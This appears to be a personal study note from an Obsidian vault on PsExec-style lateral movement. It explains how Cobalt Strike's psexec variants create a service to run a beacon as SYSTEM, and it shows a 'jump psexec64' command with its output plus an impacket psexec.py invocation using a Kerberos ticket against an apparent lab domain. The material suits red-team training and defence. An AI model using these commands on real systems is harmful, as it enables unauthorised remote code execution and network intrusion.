---
creation date: September 23rd 2022
last modified date: September 23rd 2022
aliases: []
tags: #📕
---

Primary Categories: { Add link(s) [[]] back to related PRIMARY categories }
Secondary Categories:  { Add link(s) [[]] back to related SECONDARY categories }
Links: {Add link(s) [[]] to related terms}
Search Tag: #📕  

# [[PsExec]]  
___

## Description:  

For Lateral Movement in Cobalt Strike

The `psexec` / `psexec64` commands work by first uploading a service binary to the target system, then creating and starting a Windows service to execute that binary.  `psexec_psh` doesn't copy a binary to the target, but instead executes a PowerShell one-liner (always 32-bit).

Beacons executed this way run as SYSTEM.

```
beacon> jump psexec64 srv-1 smb
Started service dd80980 on srv-1
[+] established link to child beacon: 10.10.17.25

```

### With impacket
You need a .ccache or .kirbi ticket.
To obtain those tickets from Rebeus: [[RubeusToCcache]]

```
export KRB5CCNAME=/root/impacket-examples/ticket.ccache
python psexec.py jurassic.park/trex@labwws02.jurassic.park -k -no-pass
```

___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: September 23rd 2022 (04:47 pm)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
